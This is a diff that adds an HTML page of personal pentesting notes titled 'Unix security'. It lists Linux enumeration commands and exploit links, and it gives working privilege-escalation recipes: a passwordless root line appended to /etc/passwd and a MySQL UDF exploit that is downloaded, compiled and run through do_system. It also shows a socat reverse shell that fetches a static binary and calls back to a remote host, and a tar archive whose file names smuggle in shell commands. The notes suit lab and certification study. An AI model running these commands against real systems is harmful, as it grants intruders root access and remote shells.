@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- 2025-05-25 Sun 16:43 -->
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Unix security</title>
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" type="text/css" href="/files/css/style.css"/>
+<link rel="stylesheet" type="text/css" href="/files/css/htmlize.css"/>
+<link rel="icon" href="/files/img/favicon.ico" type="image/x-icon">
+</head>
+<body>
+<div id="preamble" class="status">
+<a href="/"><img src="/files/img/profile.jpg"/></a>
+<h1>skywhi@dreamland:/var/log$ <span class="blink">_</span></h1>
+<nav>
+    <span class="nav-item">[<a href="/" title="Home">Home</a>]</span>
+    <span class="nav-item">[<a href="/posts" title="Posts">Posts</a>]</span>
+    <span class="nav-item">[<a href="/notes" title="Notes">Notes</a>]</span>
+    <span class="nav-item">[<a href="/links.html" title="Links">Links</a>]</span>
+    <span class="nav-item">[<a href="/about.html" title="About">About</a>]</span>
+</nav>
+<hr>
+</div>
+<div id="content" class="content">
+<h1 class="title">Unix security</h1>
+<p>
+<b>Table of Content</b>
+</p>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#enum">Enumeration</a></li>
+<li><a href="#orgce3f30c">Exploits</a></li>
+<li><a href="#priv-esc">Privilege escalation</a>
+<ul>
+<li><a href="#orge849ff4">Guides and references</a></li>
+<li><a href="#orgec86b92">General-purpose tools</a></li>
+<li><a href="#org733af94">Adding user to /etc/passwd</a></li>
+<li><a href="#org500d81b">Fail2Ban</a></li>
+<li><a href="#org1110b87">MySQL</a></li>
+<li><a href="#org23c3656">Kernel exploits</a></li>
+</ul>
+</li>
+<li><a href="#misc">Misc</a>
+<ul>
+<li><a href="#upgrade-shell">Upgrade simple shells to interactive ttys</a></li>
+<li><a href="#exec-tar">Executable tar file</a></li>
+</ul>
+</li>
+</ul>
+</div>
+<div id="outline-container-enum" class="outline-2">
+<h2 id="enum">Enumeration</h2>
+<div class="outline-text-2" id="text-enum">
+<p>
+Some tools and automated scripts:
+</p>
+
+<ul class="org-ul">
+<li><p>
+<a href="https://github.com/rebootuser/LinEnum">LinEnum</a>
+</p>
+
+<p>
+Here are a few common recon commands:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell"><span class="org-comment-delimiter"># </span><span class="org-comment">Env</span>
+$ uname -a
+$ cat /etc/*-release 2&gt;/dev/null
+$ env
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">Active processes</span>
+$ ps aux | grep root
+$ ps aux | grep $(<span class="org-sh-quoted-exec">whoami</span>)
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">What is readable / writeable / suid</span>
+$ find / -perm -g=s -o -perm -u=s ! -type l -exec ls -lisad {} <span class="org-string">\;</span> 2&gt;/dev/null | sort -k 5,5
+$ find / -writable -type d ! -type l -exec ls -lisad {} <span class="org-string">\;</span> 2&gt;/dev/null
+$ ls -lisaR /root /home 2&gt;/dev/null
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">Capabilities</span>
+$ getcap -r / 2&gt;/dev/null | grep <span class="org-string">'set[ug]id'</span>
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">Other user accounts</span>
+$ cat /etc/passwd | cut -d<span class="org-string">':'</span> -f1
+$ ls -lisa /home
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">Network</span>
+$ cat /etc/hosts /etc/resolv.conf
+$ ip a
+$ iptables -L
+$ arp -a
+$ netstat -tulpn 2&gt;/dev/null | grep LISTEN
+$ ss -tulpn 2&gt;/dev/null | grep LISTEN
+</pre>
+</div></li>
+</ul>
+</div>
+</div>
+<div id="outline-container-orgce3f30c" class="outline-2">
+<h2 id="orgce3f30c">Exploits</h2>
+<div class="outline-text-2" id="text-orgce3f30c">
+<ul class="org-ul">
+<li><a href="https://www.exploit-db.com/exploits/10">Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution</a></li>
+</ul>
+</div>
+</div>
+<div id="outline-container-priv-esc" class="outline-2">
+<h2 id="priv-esc">Privilege escalation</h2>
+<div class="outline-text-2" id="text-priv-esc">
+</div>
+<div id="outline-container-orge849ff4" class="outline-3">
+<h3 id="orge849ff4">Guides and references</h3>
+<div class="outline-text-3" id="text-orge849ff4">
+<ul class="org-ul">
+<li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation">Basic Linux Privilege Escalation</a>: guide by g0tm1lk.</li>
+<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html">Guide for OSCP</a>: by sushant747.</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-orgec86b92" class="outline-3">
+<h3 id="orgec86b92">General-purpose tools</h3>
+</div>
+
+<div id="outline-container-org733af94" class="outline-3">
+<h3 id="org733af94">Adding user to /etc/passwd</h3>
+<div class="outline-text-3" id="text-org733af94">
+<p>
+This adds a user with <b>root</b> privileges to the <b>/etc/passwd</b> file:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell"><span class="org-builtin">echo</span> <span class="org-string">"skw::0:0:skw:/home/skw:/bin/bash"</span> &gt;&gt; /etc/passwd
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-org500d81b" class="outline-3">
+<h3 id="org500d81b">Fail2Ban</h3>
+<div class="outline-text-3" id="text-org500d81b">
+</div>
+<div id="outline-container-org48bbeed" class="outline-4">
+<h4 id="org48bbeed">Weak permissions</h4>
+<div class="outline-text-4" id="text-org48bbeed">
+<p>
+If the current user has write permissions on the <b><i>etc/fail2ban</i></b> configuration,
+privilege escalation can be achieved. One of the possible way is described <a href="https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7">here</a>,
+where the <b>/etc/fail2ban/action.d/iptables-multiport.conf</b> file is edited to add
+a reverse shell payload.
+</p>
+
+<p>
+The gist of it is to write the commands that you will want to see executed in
+some <i>fail2ban</i> rule files. When the service gets restarted, the new
+configuration is loaded.
+</p>
+</div>
+</div>
+<div id="outline-container-org547365e" class="outline-4">
+<h4 id="org547365e">Whois manipulation</h4>
+</div>
+</div>
+<div id="outline-container-org1110b87" class="outline-3">
+<h3 id="org1110b87">MySQL</h3>
+<div class="outline-text-3" id="text-org1110b87">
+</div>
+<div id="outline-container-orga9a6a15" class="outline-4">
+<h4 id="orga9a6a15">User-Defined Functions (UDF)</h4>
+<div class="outline-text-4" id="text-orga9a6a15">
+<p>
+Privilege escalation can be achieve through UDFs (User-Defined Function)
+as described by <a href="https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf">r3d-buck3t</a> and <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation">hacktricks</a>. Simply compile the <a href="https://www.exploit-db.com/exploits/1518">exploit</a> by
+<a href="https://0xdeadbeef.info/">Marco Ivaldi aka Raptor</a> as an ELF shared library and use it to create a
+MySQL UDF.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">skw@localhost:/tmp$ curl -so udf_exp.c https://www.exploit-db.com/raw/1518
+skw@localhost:/tmp$ gcc -c udf_exp.c
+skw@localhost:/tmp$ gcc -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so udf_exp.o -lc
+
+skw@localhost:/tmp$ mysql -u root -p mysql
+MariaDB [mysql]&gt; use mysql; create table foo(line blob); insert into foo values(load_file(<span class="org-string">'/tmp/raptor_udf2.so'</span>)); <span class="org-keyword">select</span> * from foo into dumpfile <span class="org-string">'/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so'</span>; create <span class="org-keyword">function</span> <span class="org-function-name">do_system</span> returns integer soname <span class="org-string">'raptor_udf2.so'</span>; <span class="org-keyword">select</span> do_system(<span class="org-string">'id &gt; /tmp/id; chmod 777 /tmp/id'</span>);
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-org23c3656" class="outline-3">
+<h3 id="org23c3656">Kernel exploits</h3>
+<div class="outline-text-3" id="text-org23c3656">
+<ul class="org-ul">
+<li><a href="https://www.exploit-db.com/exploits/18411">Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper'
+Local Privilege Escalation (1)</a></li>
+<li>Dirty Cow (&gt; 2.6.22) <a href="https://github.com/FireFart/dirtycow">firefart</a>, <a href="https://github.com/dirtycow/dirtycow.github.io">pokemon</a>, <a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">more PoCs</a></li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-misc" class="outline-2">
+<h2 id="misc">Misc</h2>
+<div class="outline-text-2" id="text-misc">
+</div>
+<div id="outline-container-upgrade-shell" class="outline-3">
+<h3 id="upgrade-shell">Upgrade simple shells to interactive ttys</h3>
+<div class="outline-text-3" id="text-upgrade-shell">
+<p>
+Credit goes to:
+</p>
+
+<ul class="org-ul">
+<li><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">ROPNOP's blog</a></li>
+</ul>
+</div>
+<div id="outline-container-org0542e2a" class="outline-4">
+<h4 id="org0542e2a">Python</h4>
+<div class="outline-text-4" id="text-org0542e2a">
+<div class="org-src-container">
+<pre class="src src-shell">$ python -c <span class="org-string">'import pty; pty.spawn("/bin/bash")'</span>
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-orga0aeb0e" class="outline-4">
+<h4 id="orga0aeb0e">Socat</h4>
+<div class="outline-text-4" id="text-orga0aeb0e">
+<div class="org-src-container">
+<pre class="src src-shell"><span class="org-comment-delimiter"># </span><span class="org-comment">On client</span>
+$ socat file:<span class="org-sh-quoted-exec">`tty`</span>,raw,<span class="org-variable-name">echo</span>=0 tcp-listen:1234
+<span class="org-comment-delimiter"># </span><span class="org-comment">On server</span>
+$ curl -o /tmp/socat -OL https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
+$ chmod +x /tmp/socat
+$ /tmp/socat exec:<span class="org-string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:10.11.12.13:1234
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-exec-tar" class="outline-3">
+<h3 id="exec-tar">Executable tar file</h3>
+<div class="outline-text-3" id="text-exec-tar">
+<p>
+Embed and run shell commands in a tar archive:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">$ mkdircd test
+$ touch $<span class="org-string">'\nid;'</span>
+$ touch $<span class="org-string">'\nls -lisa;'</span>
+$ tar cf payload.tar *
+$ file payload.tar
+payload.tar: POSIX tar archive (GNU)
+$ chmod +x payload.tar
+$ ./payload.tar
+<span class="org-variable-name">uid</span>=1000(skywhi) <span class="org-variable-name">gid</span>=1000(skywhi) <span class="org-variable-name">groups</span>=1000(skywhi)
+./payload.tar: line 2: 0000644000175000017500000000000013715316137011115: command not found
+total 12
+641879  0 drwxr-xr-x 2 skywhi skywhi   100 Aug 13 22:03  .
+552758  0 drwxr-xr-x 3 skywhi skywhi    60 Aug 13 22:00  ..
+640946  0 -rw-r--r-- 1 skywhi skywhi     0 Aug 13 22:02 <span class="org-string">''</span>$<span class="org-string">'\n''id;'</span>
+641004  0 -rw-r--r-- 1 skywhi skywhi     0 Aug 13 22:03 <span class="org-string">''</span>$<span class="org-string">'\n''ls -lisa;'</span>
+654585 12 -rwxr-xr-x 1 skywhi skywhi 10240 Aug 13 22:03  payload.tar
+./payload.tar: line 3: 0000644000175000017500000000000013715316202012116: command not found
+</pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<p>
+    Last update: 25 May 2025 - <a href="#">Top of the page</a> - <a href="/sitemap.html">Sitemap</a> - <a href="/rss.xml"><img src="/files/img/rss.png" height="16" width="16"></a>
+</p>
+</div>
+</body>
+</html>
